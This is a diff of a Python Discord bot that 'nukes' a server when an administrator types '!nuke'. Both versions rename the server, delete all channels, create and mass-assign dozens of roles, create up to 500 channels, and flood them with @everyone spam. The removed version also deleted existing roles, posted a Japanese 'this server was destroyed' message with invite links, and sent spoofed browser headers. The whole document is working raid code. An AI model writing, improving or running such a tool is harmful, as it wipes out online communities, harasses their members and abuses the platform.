@@ -1,168 +1,199 @@
-import asyncio
-import aiohttp
 import discord
-import logging
+import aiohttp
+import asyncio
 
+TOKEN = ''
 
-TOKEN = ""
+DEFAULT_CHANNEL_COUNT = 300
 
-NEW_SERVER_NAME = "M:p植民地"
+CHANNEL_NAME_BASE = "new-channel"
 
-ROLE_NAME = "Mp万歳 gg5ch"
-ROLE_COLOR = 15548997
-ROLE_COUNT = 50
+MESSAGES_PER_CHANNEL = 20
 
-CHANNEL_NAME = "gg5ch-このサーバーはmpにより破壊された"
-CHANNEL_COUNT = 100
+ROLE_NAME = "new-roll"
+ROLE_COLOR = 0xFF0000  # 赤色
+ROLE_COUNT = 100
 
-SPAM_MESSAGE = """
-@everyone 
-# M:p万歳
-## このサーバーはM:pにより破壊されました:joy: 
-## らぷろむ主席万歳     ぱすた万歳
-discord.gg/5ch
-https://x.gd/SVod3
+NEW_SERVER_NAME = "new server"
+NEW_SERVER_ICON_URL = "" 
+
+LOOP_MESSAGE_CONTENT = """
+@everyone  @here
+new message
 """
 
-logging.getLogger('discord').setLevel(logging.CRITICAL)
+intents = discord.Intents.default()
+intents.message_content = True
 
-intents = discord.Intents.all()
-client = discord.Client(intents=intents)
+class SuperFastBot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=intents)
+        self.target_channels = []
+        self.loop_active = False
 
-API_BASE = "https://discord.com/api/v10"
+bot = SuperFastBot()
 
+@bot.event
+async def on_ready():
+    print(f'起動: {bot.user.name}')
 
-def make_headers(token):
-    return {
-        "Authorization": f"Bot {token}",
-        "Content-Type": "application/json",
-        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0OS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQ5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjU3MzQxMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImYzNjAzOGZmLTlmMTAtNDg0Ni1iMTQyLTM4Zjk5YTA2N2IyNiIsImxhdW5jaF9zaWduYXR1cmUiOiIyYzA3NDc2MC1iMDE2LTQ1YWAbODczNi1lZTM5YzQzOGI0MWYiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6Ijk5NjhlMTI0LTQ3NGQtNDc3Zi04ODY2LWRmMGYxMWI5NzJlOSJ9",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
-        "Accept": "*/*",
-        "Accept-Language": "ja,en-US;q=0.9,en;q=0.8"
-    }
+async def fetch_delete(session, channel_id, headers):
+    url = f"https://discord.com/api/v10/channels/{channel_id}"
+    async with session.delete(url, headers=headers) as response:
+        return response.status
 
-
-async def api_delete(session, url, headers):
-    async with session.delete(url, headers=headers) as resp:
-        return resp.status
-
-
-async def api_post(session, url, headers, json=None):
-    async with session.post(url, headers=headers, json=json) as resp:
-        if resp.status in (200, 201):
-            data = await resp.json()
-            return data.get("id")
+async def fetch_create(session, guild_id, name, headers):
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
+    json_data = {"name": name, "type": 0}
+    async with session.post(url, headers=headers, json=json_data) as response:
+        if response.status == 201:
+            res_json = await response.json()
+            return res_json.get("id")
         return None
 
+async def fetch_send(session, channel_id, content, headers):
+    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
+    json_data = {"content": content}
+    async with session.post(url, headers=headers, json=json_data) as response:
+        return response.status
 
-async def api_patch(session, url, headers, json=None):
-    async with session.patch(url, headers=headers, json=json) as resp:
-        return resp.status
+async def fetch_create_role(session, guild_id, name, color, headers):
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
+    json_data = {
+        "name": name,
+        "color": color,
+        "hoist": True,
+        "mentionable": True,
+        "permissions": "0"
+    }
+    async with session.post(url, headers=headers, json=json_data) as response:
+        if response.status == 200:
+            res_json = await response.json()
+            return res_json.get("id")
+        return None
 
+async def fetch_add_role(session, guild_id, member_id, role_id, headers):
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{member_id}/roles/{role_id}"
+    async with session.put(url, headers=headers) as response:
+        return response.status
 
-async def api_put(session, url, headers):
-    async with session.put(url, headers=headers) as resp:
-        return resp.status
+async def fetch_edit_guild(session, guild_id, name, icon_url, headers):
+    url = f"https://discord.com/api/v10/guilds/{guild_id}"
+    json_data = {"name": name}
+    if icon_url:
+        try:
+            async with session.get(icon_url) as img_resp:
+                if img_resp.status == 200:
+                    import base64
+                    data = await img_resp.read()
+                    b64 = base64.b64encode(data).decode()
+                    content_type = img_resp.headers.get("Content-Type", "image/png")
+                    json_data["icon"] = f"data:{content_type};base64,{b64}"
+        except:
+            pass
+    async with session.patch(url, headers=headers, json=json_data) as response:
+        return response.status
 
+async def super_fast_spam_loop(guild_id):
+    headers = {"Authorization": f"Bot {TOKEN}"}
+    
+    async with aiohttp.ClientSession() as session:
+        while bot.loop_active:
+            if not bot.target_channels:
+                await asyncio.sleep(0.1)
+                continue
+            
+            tasks = [
+                fetch_send(session, ch_id, LOOP_MESSAGE_CONTENT, headers)
+                for ch_id in bot.target_channels
+            ]
+            
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(0.05)
 
-async def do_nuke(guild):
-    guild_id = guild.id
-    token = TOKEN
-    headers = make_headers(token)
+async def limited_spam(session, channel_ids, content, headers, count):
+    for _ in range(count):
+        tasks = [
+            fetch_send(session, ch_id, content, headers)
+            for ch_id in channel_ids
+        ]
+        await asyncio.gather(*tasks)
 
-    ch_ids = [ch.id for ch in guild.channels]
-    txt_ids = [ch.id for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
-    role_ids = [r.id for r in guild.roles if r.id != guild_id and not r.managed and r < guild.me.top_role]
-    m_ids = [m.id for m in guild.members if not m.bot]
+async def do_nuke(message, count):
+    bot.loop_active = False
+    await asyncio.sleep(0.5)
+    bot.target_channels = []
+
+    guild = message.guild
+    headers = {"Authorization": f"Bot {TOKEN}"}
 
     async with aiohttp.ClientSession() as session:
-        burst_tasks = []
+        if NEW_SERVER_NAME or NEW_SERVER_ICON_URL:
+            await fetch_edit_guild(session, guild.id, NEW_SERVER_NAME, NEW_SERVER_ICON_URL, headers)
 
-        if NEW_SERVER_NAME:
-            burst_tasks.append(
-                api_patch(session, f"{API_BASE}/guilds/{guild_id}", headers, {"name": NEW_SERVER_NAME})
-            )
+        del_tasks = [fetch_delete(session, ch.id, headers) for ch in guild.channels]
+        await asyncio.gather(*del_tasks)
 
-        for cid in txt_ids:
-            burst_tasks.append(
-                api_post(session, f"{API_BASE}/channels/{cid}/messages", headers, {"content": SPAM_MESSAGE})
-            )
+        role_tasks = [
+            fetch_create_role(session, guild.id, f"{ROLE_NAME}-{i}" if ROLE_COUNT > 1 else ROLE_NAME, ROLE_COLOR, headers)
+            for i in range(ROLE_COUNT)
+        ]
+        role_results = await asyncio.gather(*role_tasks)
+        new_role_ids = [r for r in role_results if r]
 
-        for rid in role_ids:
-            burst_tasks.append(
-                api_delete(session, f"{API_BASE}/guilds/{guild_id}/roles/{rid}", headers)
-            )
+        member_ids = [m.id for m in guild.members if not m.bot]
+        for role_id in new_role_ids:
+            add_tasks = [
+                fetch_add_role(session, guild.id, mid, role_id, headers)
+                for mid in member_ids
+            ]
+            await asyncio.gather(*add_tasks)
 
-        for cid in ch_ids:
-            burst_tasks.append(
-                api_delete(session, f"{API_BASE}/channels/{cid}", headers)
-            )
+        create_tasks = [
+            fetch_create(session, guild.id, f"{CHANNEL_NAME_BASE}-{i}", headers)
+            for i in range(1, count + 1)
+        ]
+        results = await asyncio.gather(*create_tasks)
+        bot.target_channels = [ch_id for ch_id in results if ch_id is not None]
 
-        await asyncio.gather(*burst_tasks, return_exceptions=True)
+        if MESSAGES_PER_CHANNEL > 0:
+            await limited_spam(session, bot.target_channels, LOOP_MESSAGE_CONTENT, headers, MESSAGES_PER_CHANNEL)
+        else:
+            bot.loop_active = True
+            bot.loop.create_task(super_fast_spam_loop(guild.id))
 
-        create_tasks = []
+    if MESSAGES_PER_CHANNEL > 0:
+        await message.channel.send(f"💥 NUKE完了！{len(bot.target_channels)}個のチャンネルを作成!")
+    else:
+        await message.channel.send(f"💥 NUKE完了！{len(bot.target_channels)}個のチャンネルを作成,スパム開始！")
 
-        for i in range(ROLE_COUNT):
-            create_tasks.append(
-                api_post(session, f"{API_BASE}/guilds/{guild_id}/roles", headers, {
-                    "name": f"{ROLE_NAME}-{i}" if ROLE_COUNT > 1 else ROLE_NAME,
-                    "permissions": "0",
-                    "color": ROLE_COLOR,
-                    "hoist": True,
-                })
-            )
-
-        for i in range(CHANNEL_COUNT):
-            create_tasks.append(
-                api_post(session, f"{API_BASE}/guilds/{guild_id}/channels", headers, {
-                    "name": f"{CHANNEL_NAME}-{i}" if CHANNEL_COUNT > 1 else CHANNEL_NAME,
-                    "type": 0,
-                })
-            )
-
-        results = await asyncio.gather(*create_tasks, return_exceptions=True)
-
-        new_role_ids = [r for r in results[:ROLE_COUNT] if isinstance(r, str)]
-        new_channel_ids = [c for c in results[ROLE_COUNT:] if isinstance(c, str)]
-
-        final_tasks = []
-
-        for rid in new_role_ids:
-            for mid in m_ids:
-                final_tasks.append(
-                    api_put(session, f"{API_BASE}/guilds/{guild_id}/members/{mid}/roles/{rid}", headers)
-                )
-
-        await asyncio.gather(*final_tasks, return_exceptions=True)
-
-
-@client.event
-async def on_ready():
-    pass
-
-
-@client.event
+@bot.event
 async def on_message(message):
     if message.author.bot:
         return
-
-    if message.content.strip() != "!nuke":
+    
+    if message.content.startswith("!nuke"):
+        try:
+            await message.delete()
+        except:
+            pass
+        
+        if not message.author.guild_permissions.administrator:
+            return
+        
+        parts = message.content.split()
+        count = DEFAULT_CHANNEL_COUNT
+        if len(parts) > 1:
+            try:
+                count = int(parts[1])
+                if count > 500:
+                    count = 500
+                if count <= 0:
+                    count = DEFAULT_CHANNEL_COUNT
+            except ValueError:
+                pass
+        
+        await do_nuke(message, count)
         return
 
-    if message.guild is None:
-        return
-
-    perms = message.author.guild_permissions
-    if not perms or not perms.administrator:
-        return
-
-    try:
-        await message.delete()
-    except:
-        pass
-
-    await do_nuke(message.guild)
-
-
-client.run(TOKEN)
+bot.run(TOKEN)
